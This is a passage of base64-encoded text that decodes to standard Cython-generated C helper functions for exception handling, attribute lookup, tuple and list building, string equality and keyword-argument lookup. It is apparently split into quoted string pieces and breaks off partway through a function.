VfR0VUX1NJWkUodHVwbGUpOwogICAgZm9yIChpPTA7IGk8bjsgaSsrKSB7CiAgICAgICAgaWYgKGV4Y190eXBlID09IFB5VHVwbGVfR0VUX0lURU0odHVwbGUsIGkpKSByZXR1cm4gMTsKICAgIH0KICAgIGZvciAoaT0wOyBpPG47IGkrKykgewogICAgICAgIGlmIChfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXhjX3R5cGUsIFB5VHVwbGVfR0VUX0lURU0odHVwbGUsIGkpKSkgcmV0dXJuIDE7CiAgICB9CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlc0luU3RhdGUoUHlUaHJlYWRTdGF0ZSogdHN0YXRlLCBQeU9iamVjdCogZXJyKSB7CiAgICBpbnQgcmVzdWx0OwogICAgUHlPYmplY3QgKmV4Y190eXBlOwojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNgogICAgUHlPYmplY3QgKmN1cnJlbnRfZXhjZXB0aW9uID0gdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbjsKICAgIGlmICh1bmxpa2VseSghY3VycmVudF9leGNlcHRpb24pKSByZXR1cm4gMDsKICAgIGV4Y190eXBlID0gKFB5T2JqZWN0KikgUHlfVFlQRShjdXJyZW50X2V4Y2VwdGlvbik7CiAgICBpZiAoZXhjX3R5cGUgPT0gZXJyKSByZXR1cm4gMTsKI2Vsc2UKICAgIGV4Y190eXBlID0gdHN0YXRlLT5jdXJleGNfdHlwZTsKICAgIGlmIChleGNfdHlwZSA9PSBlcnIpIHJldHVybiAxOwogICAgaWYgKHVubGlrZWx5KCFleGNfdHlwZSkpIHJldHVybiAwOwojZW5kaWYKICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgUHlfSU5DUkVGKGV4""Y190eXBlKTsKICAgICNlbmRpZgogICAgaWYgKHVubGlrZWx5KFB5VHVwbGVfQ2hlY2soZXJyKSkpIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzVHVwbGUoZXhjX3R5cGUsIGVycik7CiAgICB9IGVsc2UgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgZXJyKTsKICAgIH0KICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgUHlfREVDUkVGKGV4Y190eXBlKTsKICAgICNlbmRpZgogICAgcmV0dXJuIHJlc3VsdDsKfQojZW5kaWYKCgojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpIHsKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTYKICAgIFB5T2JqZWN0ICp0bXBfdmFsdWU7CiAgICBhc3NlcnQodHlwZSA9PSBOVUxMIHx8ICh2YWx1ZSAhPSBOVUxMICYmIHR5cGUgPT0gKFB5T2JqZWN0KikgUHlfVFlQRSh2YWx1ZSkpKTsKICAgIGlmICh2YWx1ZSkgewogICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgICAgICBpZiAodW5saWtlbHkoKChQeUJhc2VFeGNlcHRpb25PYmplY3QqKSB2YWx1ZSktPnRyYWNlYmFjayAhPSB0YikpCiAgICAgICAgI2VuZGlmCiAgICAgICAgICAgIFB5RXhjZXB0aW9uX1NldFRyYWNlYmFjayh2YWx1ZSwgdGIpOwogICAgfQogICAgdG1wX3ZhbHVlID0gdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbjsKICAgIHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24gPSB2YWx1ZTsKICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTsKICAgIFB5X1hERUNSRUYodHlwZSk7CiAgICBQeV9YREVDUkVGKHRiKTsKI2Vsc2UKICAgIFB5T2JqZWN0ICp0bXBfdHlwZSwgKnRtcF92YWx1ZSwgKnRtcF90YjsKICAgIHRtcF90eXBlID0gdHN0YXRlLT5jdXJleGNfdHlwZTsKICAgIHRtcF92YWx1ZSA9IHRzdGF0ZS0+Y3VyZXhjX3ZhbHVlOwogICAgdG1wX3RiID0gdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrOwogICAgdHN0YXRlLT5jdXJleGNfdHlwZSA9IHR5cGU7CiAgICB0c3RhdGUtPmN1cmV4Y192YWx1ZSA9IHZhbHVlOwogICAgdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrID0gdGI7CiAgICBQeV9YREVDUkVGKHRtcF90eXBlKTsKICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTsKICAgIFB5X1hERUNSRUYodG1wX3RiKTsKI2VuZGlmCn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FcnJGZXRjaEluU3RhdGUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpIHsKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTYKICAgIFB5T2JqZWN0KiBleGNfdmFsdWU7CiAgICBleGNfdmFs""dWUgPSB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uOwogICAgdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiA9IDA7CiAgICAqdmFsdWUgPSBleGNfdmFsdWU7CiAgICAqdHlwZSA9IE5VTEw7CiAgICAqdGIgPSBOVUxMOwogICAgaWYgKGV4Y192YWx1ZSkgewogICAgICAgICp0eXBlID0gKFB5T2JqZWN0KikgUHlfVFlQRShleGNfdmFsdWUpOwogICAgICAgIFB5X0lOQ1JFRigqdHlwZSk7CiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgICAgICp0YiA9ICgoUHlCYXNlRXhjZXB0aW9uT2JqZWN0KikgZXhjX3ZhbHVlKS0+dHJhY2ViYWNrOwogICAgICAgIFB5X1hJTkNSRUYoKnRiKTsKICAgICAgICAjZWxzZQogICAgICAgICp0YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayhleGNfdmFsdWUpOwogICAgICAgICNlbmRpZgogICAgfQojZWxzZQogICAgKnR5cGUgPSB0c3RhdGUtPmN1cmV4Y190eXBlOwogICAgKnZhbHVlID0gdHN0YXRlLT5jdXJleGNfdmFsdWU7CiAgICAqdGIgPSB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2s7CiAgICB0c3RhdGUtPmN1cmV4Y190eXBlID0gMDsKICAgIHRzdGF0ZS0+Y3VyZXhjX3ZhbHVlID0gMDsKICAgIHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjayA9IDA7CiNlbmRpZgp9CiNlbmRpZgoKCiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSkgewogICAgUHlUeXBlT2JqZWN0KiB0cCA9IFB5X1RZUEUob2JqKTsKICAgIGlmIChsaWtlbHkodHAtPnRwX2dldGF0dHJvKSkKICAgICAgICByZXR1cm4gdHAtPnRwX2dldGF0dHJvKG9iaiwgYXR0cl9uYW1lKTsKICAgIHJldHVybiBQeU9iamVjdF9HZXRBdHRyKG9iaiwgYXR0cl9uYW1lKTsKfQojZW5kaWYKCgojaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAKc3RhdGljIHZvaWQgX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cl9DbGVhckF0dHJpYnV0ZUVycm9yKHZvaWQpIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIGlmIChsaWtlbHkoX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19BdHRyaWJ1dGVFcnJvcikpKQogICAgICAgIF9fUHl4X1B5RXJyX0NsZWFyKCk7Cn0KI2VuZGlmCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lKSB7CiAgICBQeU9iamVjdCAqcmVzdWx0OwojaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiAgICAodm9pZCkgUHlPYmplY3RfR2V0T3B0aW9uYWxBdHRyKG9iaiwgYXR0cl9uYW1lLCAmcmVzdWx0KTsKICAgIHJldHVybiByZXN1bHQ7CiNlbHNlCiNpZiBDWVRIT05fQ09NUElM""SU5HX0lOX0NQWVRIT04gJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgICBQeVR5cGVPYmplY3QqIHRwID0gUHlfVFlQRShvYmopOwogICAgaWYgKGxpa2VseSh0cC0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7CiAgICAgICAgcmV0dXJuIF9QeU9iamVjdF9HZW5lcmljR2V0QXR0cldpdGhEaWN0KG9iaiwgYXR0cl9uYW1lLCBOVUxMLCAxKTsKICAgIH0KI2VuZGlmCiAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG9iaiwgYXR0cl9uYW1lKTsKICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkgewogICAgICAgIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJfQ2xlYXJBdHRyaWJ1dGVFcnJvcigpOwogICAgfQogICAgcmV0dXJuIHJlc3VsdDsKI2VuZGlmCn0KCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEJ1aWx0aW5OYW1lKFB5T2JqZWN0ICpuYW1lKSB7CiAgICBQeU9iamVjdCogcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfYiwgbmFtZSk7CiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkgJiYgIVB5RXJyX09jY3VycmVkKCkpIHsKICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfTmFtZUVycm9yLAogICAgICAgICAgICAibmFtZSAnJVUnIGlzIG5vdCBkZWZpbmVkIiwgbmFtZSk7CiAgICB9CiAgICByZXR1cm4gcmVzdWx0Owp9CgoKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgQ1lUSE9OX01FVEhfRkFTVENBTEwKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKgpfX1B5eF9QeVR1cGxlX0Zyb21BcnJheShQeU9iamVjdCAqY29uc3QgKnNyYywgUHlfc3NpemVfdCBuKQp7CiAgICBQeU9iamVjdCAqcmVzOwogICAgUHlfc3NpemVfdCBpOwogICAgaWYgKG4gPD0gMCkgewogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUpOwogICAgfQogICAgcmVzID0gUHlUdXBsZV9OZXcobik7CiAgICBpZiAodW5saWtlbHkocmVzID09IE5VTEwpKSByZXR1cm4gTlVMTDsKICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspIHsKICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfUHlUdXBsZV9TRVRfSVRFTShyZXMsIGksIHNyY1tpXSkgPCAwKSkgewogICAgICAgICAgICBQeV9ERUNSRUYocmVzKTsKICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgfQogICAgICAgIFB5X0lOQ1JFRihzcmNbaV0pOwogICAgfQogICAgcmV0dXJuIHJlczsKfQojZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04Kc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9jb3B5X29iamVjdF9hcnJheShQeU9iamVjdCAqY29uc3QgKkNZVEhPTl9SRVNUUklDVCBzcmMsIFB5T2JqZWN0KiogQ1lUSE9OX1JFU1RSSUNUIGRlc3QsIFB5X3NzaXplX3QgbGVuZ3RoKSB7CiAgICBQeU9iamVjdCAqdjsKICAgIFB5X3NzaXplX3QgaTsKICAgIGZvciAo""aSA9IDA7IGkgPCBsZW5ndGg7IGkrKykgewogICAgICAgIHYgPSBkZXN0W2ldID0gc3JjW2ldOwogICAgICAgIFB5X0lOQ1JFRih2KTsKICAgIH0KfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqCl9fUHl4X1B5VHVwbGVfRnJvbUFycmF5KFB5T2JqZWN0ICpjb25zdCAqc3JjLCBQeV9zc2l6ZV90IG4pCnsKICAgIFB5T2JqZWN0ICpyZXM7CiAgICBpZiAobiA8PSAwKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSk7CiAgICB9CiAgICByZXMgPSBQeVR1cGxlX05ldyhuKTsKICAgIGlmICh1bmxpa2VseShyZXMgPT0gTlVMTCkpIHJldHVybiBOVUxMOwogICAgX19QeXhfY29weV9vYmplY3RfYXJyYXkoc3JjLCAoKFB5VHVwbGVPYmplY3QqKXJlcyktPm9iX2l0ZW0sIG4pOwogICAgcmV0dXJuIHJlczsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqCl9fUHl4X1B5TGlzdF9Gcm9tQXJyYXkoUHlPYmplY3QgKmNvbnN0ICpzcmMsIFB5X3NzaXplX3QgbikKewogICAgUHlPYmplY3QgKnJlczsKICAgIGlmIChuIDw9IDApIHsKICAgICAgICByZXR1cm4gUHlMaXN0X05ldygwKTsKICAgIH0KICAgIHJlcyA9IFB5TGlzdF9OZXcobik7CiAgICBpZiAodW5saWtlbHkocmVzID09IE5VTEwpKSByZXR1cm4gTlVMTDsKICAgIF9fUHl4X2NvcHlfb2JqZWN0X2FycmF5KHNyYywgKChQeUxpc3RPYmplY3QqKXJlcyktPm9iX2l0ZW0sIG4pOwogICAgcmV0dXJuIHJlczsKfQojZW5kaWYKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlCeXRlc19FcXVhbHMoUHlPYmplY3QqIHMxLCBQeU9iamVjdCogczIsIGludCBlcXVhbHMpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgfHxcCiAgICAgICAgIShDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TKQogICAgcmV0dXJuIFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbChzMSwgczIsIGVxdWFscyk7CiNlbHNlCiAgICBpZiAoczEgPT0gczIpIHsKICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9FUSk7CiAgICB9IGVsc2UgaWYgKFB5Qnl0ZXNfQ2hlY2tFeGFjdChzMSkgJiBQeUJ5dGVzX0NoZWNrRXhhY3QoczIpKSB7CiAgICAgICAgY29uc3QgY2hhciAqcHMxLCAqcHMyOwogICAgICAgIFB5X3NzaXplX3QgbGVuZ3RoID0gUHlCeXRlc19HRVRfU0laRShzMSk7CiAgICAgICAgaWYgKGxlbmd0aCAhPSBQeUJ5dGVzX0dFVF9TSVpFKHMyKSkKICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfTkUpOwogICAgICAgIHBzMSA9IFB5Qnl0ZXNfQVNfU1RSSU5HKHMxKTsKICAgICAgICBwczIgPSBQeUJ5dGVzX0FTX1NUUklORyhzMik7CiAgICAgICAgaWYgKHBzMVswXSAhPSBwczJbMF0pIHsKICAgICAgICAgICAgcmV0dXJuIChlcXVh""bHMgPT0gUHlfTkUpOwogICAgICAgIH0gZWxzZSBpZiAobGVuZ3RoID09IDEpIHsKICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfRVEpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGludCByZXN1bHQ7CiNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTICYmIChQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQjAwMDApCiAgICAgICAgICAgIFB5X2hhc2hfdCBoYXNoMSwgaGFzaDI7CiAgICAgICAgICAgIGhhc2gxID0gKChQeUJ5dGVzT2JqZWN0KilzMSktPm9iX3NoYXNoOwogICAgICAgICAgICBoYXNoMiA9ICgoUHlCeXRlc09iamVjdCopczIpLT5vYl9zaGFzaDsKICAgICAgICAgICAgaWYgKGhhc2gxICE9IGhhc2gyICYmIGhhc2gxICE9IC0xICYmIGhhc2gyICE9IC0xKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7CiAgICAgICAgICAgIH0KI2VuZGlmCiAgICAgICAgICAgIHJlc3VsdCA9IG1lbWNtcChwczEsIHBzMiwgKHNpemVfdClsZW5ndGgpOwogICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9FUSkgPyAocmVzdWx0ID09IDApIDogKHJlc3VsdCAhPSAwKTsKICAgICAgICB9CiAgICB9IGVsc2UgaWYgKChzMSA9PSBQeV9Ob25lKSAmIFB5Qnl0ZXNfQ2hlY2tFeGFjdChzMikpIHsKICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7CiAgICB9IGVsc2UgaWYgKChzMiA9PSBQeV9Ob25lKSAmIFB5Qnl0ZXNfQ2hlY2tFeGFjdChzMSkpIHsKICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7CiAgICB9IGVsc2UgewogICAgICAgIGludCByZXN1bHQ7CiAgICAgICAgUHlPYmplY3QqIHB5X3Jlc3VsdCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKHMxLCBzMiwgZXF1YWxzKTsKICAgICAgICBpZiAoIXB5X3Jlc3VsdCkKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShweV9yZXN1bHQpOwogICAgICAgIFB5X0RFQ1JFRihweV9yZXN1bHQpOwogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CiNlbmRpZgp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5VW5pY29kZV9FcXVhbHMoUHlPYmplY3QqIHMxLCBQeU9iamVjdCogczIsIGludCBlcXVhbHMpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwKICAgIHJldHVybiBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woczEsIHMyLCBlcXVhbHMpOwojZWxzZQogICAgaW50IHMxX2lzX3VuaWNvZGUsIHMyX2lzX3VuaWNvZGU7CiAgICBpZiAoczEgPT0gczIpIHsKICAgICAgICBnb3RvIHJldHVybl9lcTsKICAgIH0KICAgIHMxX2lzX3VuaWNvZGUgPSBQeVVuaWNvZGVfQ2hlY2tFeGFjdChzMSk7CiAgICBzMl9pc191bmljb2RlID0gUHlVbmljb2RlX0NoZWNrRXhhY3QoczIpOwogICAgaWYgKHMxX2lzX3VuaWNvZGUgJiBzMl9p""c191bmljb2RlKSB7CiAgICAgICAgUHlfc3NpemVfdCBsZW5ndGgsIGxlbmd0aDI7CiAgICAgICAgaW50IGtpbmQ7CiAgICAgICAgdm9pZCAqZGF0YTEsICpkYXRhMjsKICAgICAgICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfUHlVbmljb2RlX1JFQURZKHMxKSA8IDApIHx8IHVubGlrZWx5KF9fUHl4X1B5VW5pY29kZV9SRUFEWShzMikgPCAwKSkKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICNlbmRpZgogICAgICAgIGxlbmd0aCA9IF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKHMxKTsKICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgaWYgKHVubGlrZWx5KGxlbmd0aCA8IDApKSByZXR1cm4gLTE7CiAgICAgICAgI2VuZGlmCiAgICAgICAgbGVuZ3RoMiA9IF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKHMyKTsKICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgaWYgKHVubGlrZWx5KGxlbmd0aDIgPCAwKSkgcmV0dXJuIC0xOwogICAgICAgICNlbmRpZgogICAgICAgIGlmIChsZW5ndGggIT0gbGVuZ3RoMikgewogICAgICAgICAgICBnb3RvIHJldHVybl9uZTsKICAgICAgICB9CiNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTCiAgICAgICAgewogICAgICAgICAgICBQeV9oYXNoX3QgaGFzaDEsIGhhc2gyOwogICAgICAgICAgICBoYXNoMSA9ICgoUHlBU0NJSU9iamVjdCopczEpLT5oYXNoOwogICAgICAgICAgICBoYXNoMiA9ICgoUHlBU0NJSU9iamVjdCopczIpLT5oYXNoOwogICAgICAgICAgICBpZiAoaGFzaDEgIT0gaGFzaDIgJiYgaGFzaDEgIT0gLTEgJiYgaGFzaDIgIT0gLTEpIHsKICAgICAgICAgICAgICAgIGdvdG8gcmV0dXJuX25lOwogICAgICAgICAgICB9CiAgICAgICAgfQojZW5kaWYKICAgICAgICBraW5kID0gX19QeXhfUHlVbmljb2RlX0tJTkQoczEpOwogICAgICAgIGlmIChraW5kICE9IF9fUHl4X1B5VW5pY29kZV9LSU5EKHMyKSkgewogICAgICAgICAgICBnb3RvIHJldHVybl9uZTsKICAgICAgICB9CiAgICAgICAgZGF0YTEgPSBfX1B5eF9QeVVuaWNvZGVfREFUQShzMSk7CiAgICAgICAgZGF0YTIgPSBfX1B5eF9QeVVuaWNvZGVfREFUQShzMik7CiAgICAgICAgaWYgKF9fUHl4X1B5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGExLCAwKSAhPSBfX1B5eF9QeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhMiwgMCkpIHsKICAgICAgICAgICAgZ290byByZXR1cm5fbmU7CiAgICAgICAgfSBlbHNlIGlmIChsZW5ndGggPT0gMSkgewogICAgICAgICAgICBnb3RvIHJldHVybl9lcTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpbnQgcmVzdWx0ID0gbWVtY21wKGRhdGExLCBkYXRhMiwgKHNpemVfdCkobGVuZ3RoICoga2luZCkpOwogICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9FUSkgPyAocmVzdWx0ID09IDApIDogKHJlc3VsdCAhPSAwKTsKICAgICAg""ICB9CiAgICB9IGVsc2UgaWYgKChzMSA9PSBQeV9Ob25lKSAmIHMyX2lzX3VuaWNvZGUpIHsKICAgICAgICBnb3RvIHJldHVybl9uZTsKICAgIH0gZWxzZSBpZiAoKHMyID09IFB5X05vbmUpICYgczFfaXNfdW5pY29kZSkgewogICAgICAgIGdvdG8gcmV0dXJuX25lOwogICAgfSBlbHNlIHsKICAgICAgICBpbnQgcmVzdWx0OwogICAgICAgIFB5T2JqZWN0KiBweV9yZXN1bHQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShzMSwgczIsIGVxdWFscyk7CiAgICAgICAgaWYgKCFweV9yZXN1bHQpCiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUocHlfcmVzdWx0KTsKICAgICAgICBQeV9ERUNSRUYocHlfcmVzdWx0KTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQpyZXR1cm5fZXE6CiAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9FUSk7CnJldHVybl9uZToKICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTsKI2VuZGlmCn0KCgojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9HZXRLd1ZhbHVlX0ZBU1RDQUxMKFB5T2JqZWN0ICprd25hbWVzLCBQeU9iamVjdCAqY29uc3QgKmt3dmFsdWVzLCBQeU9iamVjdCAqcykKewogICAgUHlfc3NpemVfdCBpLCBuID0gX19QeXhfUHlUdXBsZV9HRVRfU0laRShrd25hbWVzKTsKICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgIGlmICh1bmxpa2VseShuID09IC0xKSkgcmV0dXJuIE5VTEw7CiAgICAjZW5kaWYKICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspCiAgICB7CiAgICAgICAgUHlPYmplY3QgKm5hbWVpID0gX19QeXhfUHlUdXBsZV9HRVRfSVRFTShrd25hbWVzLCBpKTsKICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICAgICBpZiAodW5saWtlbHkoIW5hbWVpKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgI2VuZGlmCiAgICAgICAgaWYgKHMgPT0gbmFtZWkpIHJldHVybiBrd3ZhbHVlc1tpXTsKICAgIH0KICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspCiAgICB7CiAgICAgICAgUHlPYmplY3QgKm5hbWVpID0gX19QeXhfUHlUdXBsZV9HRVRfSVRFTShrd25hbWVzLCBpKTsKICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICAgICBpZiAodW5saWtlbHkoIW5hbWVpKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgI2VuZGlmCiAgICAgICAgaW50IGVxID0gX19QeXhfUHlVbmljb2RlX0VxdWFscyhzLCBuYW1laSwgUHlfRVEpOwogICAgICAgIGlmICh1bmxpa2VseShlcSAhPSAwKSkgewogICAgICAgICAgICBpZiAodW5saWtlbHkoZXEgPCAwKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgICAgIHJldHVybiBrd3ZhbHVlc1tpXTsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gTlVMTDsKfQojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgfHwgQ1lUSE9O""X0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpDWVRIT05fVU5VU0VEIHN0YXRpYyBQeU9iamVjdCAqX19QeXhfS3dhcmdzQXNEaWN0X0ZBU1RDQUxMKFB5T2JqZWN0ICprd25hbWVzLCBQeU9iamVjdCAqY29uc3QgKmt3dmFsdWVzKSB7CiAgICBQeV9zc2l6ZV90IGksIG5rd2FyZ3M7CiAgICBQeU9iamVjdCAqZGljdDsKI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgbmt3YXJncyA9IFB5VHVwbGVfU2l6ZShrd25hbWVzKTsKICAgIGlmICh1bmxpa2VseShua3dhcmdzIDwgMCkpIHJldHVybiBOVUxMOwojZWxzZQogICAgbmt3YXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoa3duYW1lcyk7CiNlbmRpZgogICAgZGljdCA9IFB5RGljdF9OZXcoKTsKICAgIGlmICh1bmxpa2VseSghZGljdCkpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICBmb3IgKGk9MDsgaTxua3dhcmdzOyBpKyspIHsKI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgICAgICAgUHlPYmplY3QgKmtleSA9IFB5VHVwbGVfR2V0SXRlbShrd25hbWVzLCBpKTsKICAgICAgICBpZiAoIWtleSkgZ290byBiYWQ7CiNlbHNlCiAgICAgICAgUHlPYmplY3QgKmtleSA9IFB5VHVwbGVfR0VUX0lURU0oa3duYW1lcywgaSk7CiNlbmRpZgogICAgICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbShkaWN0LCBrZXksIGt3dmFsdWVzW2ldKSA8IDApKQogICAgICAgICAgICBnb3RvIGJhZDsKICAgIH0KICAgIHJldHVybiBkaWN0OwpiYWQ6CiAgICBQeV9ERUNSRUYoZGljdCk7CiAgICByZXR1cm4gTlVMTDsKfQojZW5kaWYKI2VuZGlmCgoKc3RhdGljIHZvaWQgX19QeXhfUmFpc2VEb3VibGVLZXl3b3Jkc0Vycm9yKAogICAgY29uc3QgY2hhciogZnVuY19uYW1lLAogICAgUHlPYmplY3QqIGt3X25hbWUpCnsKICAgI